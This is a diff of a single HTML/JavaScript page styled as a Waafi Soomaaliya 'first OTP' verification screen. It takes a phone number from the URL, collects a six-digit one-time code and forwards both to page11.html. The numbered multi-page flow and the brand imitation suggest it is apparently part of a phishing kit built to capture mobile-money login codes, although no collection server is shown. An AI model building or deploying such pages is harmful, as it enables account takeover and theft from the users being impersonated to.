@@ -1,81 +1,113 @@
 <!DOCTYPE html>
-<html lang="so">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <title>OTP Verification</title>
 
 <style>
 
 body{
     margin:0;
-    font-family:Arial, sans-serif;
-    background:#f4f4f4;
+    font-family: Arial, sans-serif;
+    background:#f3f3f3;
     display:flex;
     justify-content:center;
     align-items:center;
     height:100vh;
+    overflow:hidden;
+}
+
+/* GREEN BOTTOM BACKGROUND */
+.green-bottom{
+    position:fixed;
+    bottom:0;
+    left:0;
+    width:100%;
+    height:35%;
+    background:#8CC63F;
+    z-index:-1;
 }
 
 /* CARD */
 .card{
-    background:white;
     width:90%;
     max-width:400px;
-    padding:30px 20px;
-    border-radius:20px;
+    background:white;
+    border-radius:18px;
+    padding:25px;
     text-align:center;
-    box-shadow:0 5px 20px rgba(0,0,0,0.1);
+    box-shadow:0 8px 20px rgba(0,0,0,0.1);
+    animation:fadeUp 0.6s ease;
+}
+
+@keyframes fadeUp{
+    from{
+        opacity:0;
+        transform:translateY(40px);
+    }
+    to{
+        opacity:1;
+        transform:translateY(0);
+    }
 }
 
 h2{
     margin-bottom:10px;
 }
 
-.phone{
+.number{
     font-size:18px;
-    margin:15px 0;
+    margin:10px 0 20px;
 }
 
 /* OTP BOXES */
 .otp-container{
     display:flex;
     justify-content:center;
-    gap:10px;
-    margin:20px 0;
+    gap:8px;
 }
 
-.otp{
+.otp-container input{
     width:45px;
     height:50px;
     font-size:22px;
     text-align:center;
-    border:2px solid #6cc04a;
+    border:2px solid #8CC63F;
     border-radius:10px;
     outline:none;
 }
 
+/* COUNTDOWN */
+.timer{
+    margin-top:15px;
+    color:#777;
+}
+
 /* BUTTON */
 button{
+    margin-top:20px;
     width:100%;
     padding:15px;
     border:none;
     border-radius:10px;
-    background:#ccc;
-    color:white;
+    background:#ddd;
+    color:#888;
     font-size:16px;
-    margin-top:20px;
+    cursor:not-allowed;
 }
 
 button.active{
-    background:#6cc04a;
+    background:#8CC63F;
+    color:white;
+    cursor:pointer;
 }
 
 .footer{
-    margin-top:25px;
-    color:#777;
-    font-size:13px;
+    position:fixed;
+    bottom:10px;
+    color:white;
+    font-size:14px;
 }
 
 </style>
@@ -83,100 +115,121 @@ button.active{
 
 <body>
 
+<div class="green-bottom"></div>
+
 <div class="card">
 
 <h2>Xaqiijinta OTP-ga Kowaad</h2>
 
 <p>Geli OTP-ga kowaad ee loogu diray lambarka taleefankaaga</p>
 
-<div class="phone" id="phoneNumber"></div>
+<div class="number" id="phoneNumber"></div>
 
 <!-- OTP INPUTS -->
 <div class="otp-container">
-<input class="otp" maxlength="1">
-<input class="otp" maxlength="1">
-<input class="otp" maxlength="1">
-<input class="otp" maxlength="1">
-<input class="otp" maxlength="1">
-<input class="otp" maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
 </div>
 
-<p>Koodka mar kale u dir 28 ilbiriqsi</p>
+<div class="timer">
+Koodka mar kale u dir <span id="countdown">02:00</span>
+</div>
 
 <button id="verifyBtn">XAQIIJI OTP-GA KOWAAD</button>
 
-<div class="footer">© 2026 Waafi Soomaaliya</div>
+</div>
 
+<div class="footer">
+© 2026 Waafi Soomaaliya
 </div>
 
 <script>
 
 /* ===============================
-   LOAD PHONE NUMBER FROM PAGE 9
-================================ */
-
-const phone = localStorage.getItem("phoneNumber");
+   RECEIVE NUMBER FROM PAGE 9
+================================*/
+const params = new URLSearchParams(window.location.search);
+const phone = params.get("phone");
 
 if(!phone){
     alert("Number missing");
-    window.location.href="page3.html";
+} else {
+    document.getElementById("phoneNumber").innerText = phone;
 }
 
-document.getElementById("phoneNumber").innerText = phone;
-
-
 /* ===============================
-   OTP AUTO INPUT
-================================ */
-
-const inputs = document.querySelectorAll(".otp");
-const btn = document.getElementById("verifyBtn");
+   OTP AUTO MOVE
+================================*/
+const inputs = document.querySelectorAll(".otp-container input");
 
 inputs.forEach((input,index)=>{
-
     input.addEventListener("input",()=>{
-
         if(input.value.length === 1 && index < inputs.length-1){
             inputs[index+1].focus();
         }
-
         checkOTP();
     });
-
 });
 
-
+/* ===============================
+   ENABLE BUTTON WHEN FULL OTP
+================================*/
 function checkOTP(){
+    let code="";
+    inputs.forEach(i=> code+=i.value);
 
-    let code = "";
+    const btn=document.getElementById("verifyBtn");
 
-    inputs.forEach(i => code += i.value);
-
-    if(code.length === 6){
+    if(code.length===6){
         btn.classList.add("active");
-        btn.disabled = false;
-    }else{
-        btn.classList.remove("active");
-        btn.disabled = true;
+        btn.disabled=false;
     }
 }
 
+/* ===============================
+   COUNTDOWN 2 MINUTES
+================================*/
+let time = 120; // 2 minutes
+
+const countdownEl=document.getElementById("countdown");
+
+const timer=setInterval(()=>{
+    let minutes=Math.floor(time/60);
+    let seconds=time%60;
+
+    countdownEl.innerText =
+        `${String(minutes).padStart(2,'0')}:${String(seconds).padStart(2,'0')}`;
+
+    time--;
+
+    if(time<0){
+        clearInterval(timer);
+        countdownEl.innerText="00:00";
+    }
+
+},1000);
 
 /* ===============================
-   VERIFY BUTTON
-================================ */
+   CONTINUE TO PAGE 11
+================================*/
+document.getElementById("verifyBtn").onclick=function(){
 
-btn.addEventListener("click",()=>{
+    let otp="";
+    inputs.forEach(i=> otp+=i.value);
 
-    let otp = "";
+    if(otp.length!==6){
+        alert("Enter OTP");
+        return;
+    }
 
-    inputs.forEach(i => otp += i.value);
-
-    localStorage.setItem("otpCode", otp);
-
-    // move to next page
-    window.location.href = "page11.html";
-});
+    // send phone + otp
+    window.location.href =
+        "page11.html?phone="+encodeURIComponent(phone)+"&otp="+otp;
+};
 
 </script>
 
